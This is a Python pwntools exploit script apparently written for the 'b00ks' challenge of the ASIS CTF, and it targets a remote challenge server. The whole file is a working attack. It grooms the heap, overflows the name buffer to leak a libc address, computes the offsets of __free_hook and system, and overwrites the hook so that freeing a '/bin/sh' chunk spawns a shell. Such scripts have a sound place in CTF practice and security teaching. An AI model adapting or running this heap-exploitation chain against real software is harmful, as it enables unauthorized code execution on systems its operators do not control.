from pwn import *

# p = process("./b00ks")
p = remote('books.asis-ctf.ir', 13007)

p.recvuntil('name: ')
p.sendline('tmp')

def menu():
	p.recvuntil('> ')

def create(size1, name1, size2, name2):
	menu()
	p.sendline('1')

	p.recvuntil(': ')
	p.sendline(str(size1))
	p.recvuntil(': ')
	p.send(name1)

	p.recvuntil(': ')
	p.sendline(str(size2))
	p.recvuntil(': ')
	p.send(name2)

def change_name(name):
	menu()
	p.sendline('5')

	p.recvuntil(': ')
	p.send(name)

def delete(bid):
	menu()
	p.sendline('2')

	p.recvuntil(': ')
	p.sendline(str(bid))

for i in xrange(20):
	print i
	if i == 19:
		create(0x50, 'X' + chr(i) + '\n', 0x30, 'X' + chr(i) + '\n')
	# elif i == 18:
	#	create(0x20, 'X' + chr(i) + '\n', 0x8, 'X' + chr(i) + '\n')
	else:
		create(0x8, 'X' + chr(i) + '\n', 0x8, 'X' + chr(i) + '\n')

# victim 18

delete(1)
create(0x20, 'A\n', 0x20, 'A\n') # 21

delete(17)
delete(20)

change_name('A' * 32 + '\n')

create(0x200, 'B\n', 0x40, 'B\n') # 22
delete(22)

menu()
p.sendline('4')
p.recvuntil('ID: 16')
p.recvuntil('Name: ')
p.recvuntil('Name: ')
addr = u64(p.recv(6) + '\x00\x00')
print hex(addr)

# gdb.attach(p)
raw_input('wait')
# p.interactive()


libc_base = addr - 0x3c4c58
print hex(libc_base)
free_hook = libc_base + 0x3c69a8
system = libc_base + 0x443d0
 
create(0x20, p64(43) + p64(free_hook) * 2 + '\x10\n', 0x20, '/bin/sh\x00' + '\n') # 23

menu()
p.sendline('3')
p.recvuntil(': ')
p.sendline('43')
p.recvuntil(': ')
p.sendline(p64(system))

delete(23)

gdb.attach(p)

p.interactive()


